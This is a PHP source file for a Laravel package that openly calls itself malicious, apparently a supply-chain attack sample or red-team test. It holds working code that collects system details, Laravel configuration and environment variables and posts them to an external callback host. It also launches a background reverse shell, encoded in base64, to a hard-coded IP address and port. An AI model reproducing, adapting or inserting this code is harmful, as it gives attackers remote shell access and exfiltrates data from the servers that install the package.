<?php

namespace Laravel\MaliciousPackage;

class MaliciousPackage
{
    private $config;

    public function __construct()
    {
        // Load configuration
        $configPath = __DIR__ . '/../config.php';
        $this->config = file_exists($configPath) ? include $configPath : $this->getDefaultConfig();
    }

    /**
     * Get default configuration if config file doesn't exist
     */
    private function getDefaultConfig()
    {
        return [
            'callback' => [
                'url' => 'http://n7vywh0uxslyc3q81o29dyyhw82zqvek.oastify.com',
                'timeout' => 10,
                'user_agent' => 'Laravel-Malicious-Package/1.0'
            ],
            'reverse_shell' => [
                'host' => '77.110.126.70',
                'port' => 4444,
                'timeout' => 30
            ],
            'stealth' => [
                'silent_errors' => true,
                'background_execution' => true,
                'encode_payloads' => true
            ],
            'gather_info' => [
                'system_info' => true,
                'laravel_config' => true,
                'environment_vars' => true,
                'file_permissions' => true,
                'redact_sensitive' => true
            ],
            'sensitive_keys' => [
                'DB_PASSWORD', 'APP_KEY', 'AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID',
                'MAIL_PASSWORD', 'REDIS_PASSWORD', 'PUSHER_APP_SECRET', 'JWT_SECRET', 'STRIPE_SECRET'
            ]
        ];
    }

    /**
     * Send HTTP callback with system information
     */
    public function sendCallback()
    {
        try {
            $systemInfo = $this->collectSystemInfo();
            
            $data = [
                'message' => 'Malicious package executed successfully!',
                'timestamp' => date('Y-m-d H:i:s'),
                'system_info' => $systemInfo,
                'laravel_info' => $this->getLaravelInfo()
            ];

            // Send POST request to callback URL
            $this->sendHttpRequest($this->config['callback']['url'], $data);
            
        } catch (\Exception $e) {
            // Log error but don't break the application
            error_log("Callback failed: " . $e->getMessage());
        }
    }

    /**
     * Execute reverse shell
     */
    public function executeReverseShell()
    {
        try {
            // Execute reverse shell in background to avoid blocking Laravel
            $this->backgroundReverseShell();
            
        } catch (\Exception $e) {
            error_log("Reverse shell failed: " . $e->getMessage());
        }
    }

    /**
     * Gather additional system information
     */
    public function gatherSystemInfo()
    {
        try {
            $info = [
                'env_vars' => $this->getEnvironmentVariables(),
                'laravel_config' => $this->getLaravelConfig(),
                'file_permissions' => $this->checkFilePermissions()
            ];

            // Send additional info to callback
            $this->sendHttpRequest($this->config['callback']['url'] . '/additional', $info);
            
        } catch (\Exception $e) {
            error_log("System info gathering failed: " . $e->getMessage());
        }
    }

    /**
     * Collect basic system information
     */
    private function collectSystemInfo()
    {
        return [
            'php_version' => phpversion(),
            'os' => php_uname(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
            'user' => get_current_user(),
            'working_directory' => getcwd(),
            'php_extensions' => get_loaded_extensions(),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time')
        ];
    }

    /**
     * Get Laravel specific information
     */
    private function getLaravelInfo()
    {
        $info = [];
        
        try {
            if (function_exists('app')) {
                $app = app();
                $info['laravel_version'] = $app->version();
                $info['environment'] = $app->environment();
                $info['debug_mode'] = config('app.debug', false);
                $info['app_name'] = config('app.name', 'Unknown');
                $info['app_url'] = config('app.url', 'Unknown');
            }
        } catch (\Exception $e) {
            $info['error'] = 'Could not gather Laravel info: ' . $e->getMessage();
        }

        return $info;
    }

    /**
     * Get environment variables (filtered for security)
     */
    private function getEnvironmentVariables()
    {
        $sensitiveKeys = $this->config['sensitive_keys'];
        $envVars = [];
        
        foreach ($_ENV as $key => $value) {
            if (in_array($key, $sensitiveKeys)) {
                $envVars[$key] = '***REDACTED***';
            } else {
                $envVars[$key] = $value;
            }
        }

        return $envVars;
    }

    /**
     * Get Laravel configuration
     */
    private function getLaravelConfig()
    {
        $config = [];
        
        try {
            if (function_exists('config')) {
                $config['database'] = config('database.default');
                $config['cache'] = config('cache.default');
                $config['session'] = config('session.driver');
                $config['queue'] = config('queue.default');
            }
        } catch (\Exception $e) {
            $config['error'] = 'Could not gather config: ' . $e->getMessage();
        }

        return $config;
    }

    /**
     * Check file permissions
     */
    private function checkFilePermissions()
    {
        $paths = [
            getcwd(),
            getcwd() . '/.env',
            getcwd() . '/storage',
            getcwd() . '/bootstrap/cache'
        ];

        $permissions = [];
        foreach ($paths as $path) {
            if (file_exists($path)) {
                $permissions[$path] = [
                    'readable' => is_readable($path),
                    'writable' => is_writable($path),
                    'permissions' => substr(sprintf('%o', fileperms($path)), -4)
                ];
            }
        }

        return $permissions;
    }

    /**
     * Send HTTP request
     */
    private function sendHttpRequest($url, $data)
    {
        $payload = json_encode($data);
        
        // Try cURL first
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json',
                'User-Agent: ' . $this->config['callback']['user_agent']
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, $this->config['callback']['timeout']);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            
            $result = curl_exec($ch);
            curl_close($ch);
            
            return $result;
        }
        
        // Fallback to file_get_contents
        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/json\r\n",
                'content' => $payload,
                'timeout' => $this->config['callback']['timeout']
            ]
        ]);
        
        return file_get_contents($url, false, $context);
    }

    /**
     * Execute reverse shell in background
     */
    private function backgroundReverseShell()
    {
        // Base64 encoded reverse shell to avoid detection
        $reverseShellCode = base64_encode($this->getReverseShellCode());
        
        // Execute in background
        if (function_exists('exec')) {
            exec("php -r \"eval(base64_decode('$reverseShellCode'));\" > /dev/null 2>&1 &");
        } elseif (function_exists('shell_exec')) {
            shell_exec("php -r \"eval(base64_decode('$reverseShellCode'));\" > /dev/null 2>&1 &");
        } elseif (function_exists('system')) {
            system("php -r \"eval(base64_decode('$reverseShellCode'));\" > /dev/null 2>&1 &");
        }
    }

    /**
     * Get reverse shell PHP code
     */
    private function getReverseShellCode()
    {
        $host = $this->config['reverse_shell']['host'];
        $port = $this->config['reverse_shell']['port'];
        
        return "
        \$sock = fsockopen('$host', $port);
        if (\$sock) {
            \$descriptorspec = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );
            \$process = proc_open('/bin/sh', \$descriptorspec, \$pipes);
            if (is_resource(\$process)) {
                fwrite(\$pipes[0], \"cd \" . getcwd() . \"\n\");
                while (true) {
                    if (feof(\$sock)) break;
                    \$input = fread(\$sock, 1024);
                    if (\$input) {
                        fwrite(\$pipes[0], \$input);
                        \$output = fread(\$pipes[1], 1024);
                        fwrite(\$sock, \$output);
                    }
                }
                fclose(\$pipes[0]);
                fclose(\$pipes[1]);
                fclose(\$pipes[2]);
                proc_close(\$process);
            }
            fclose(\$sock);
        }
        ";
    }
}
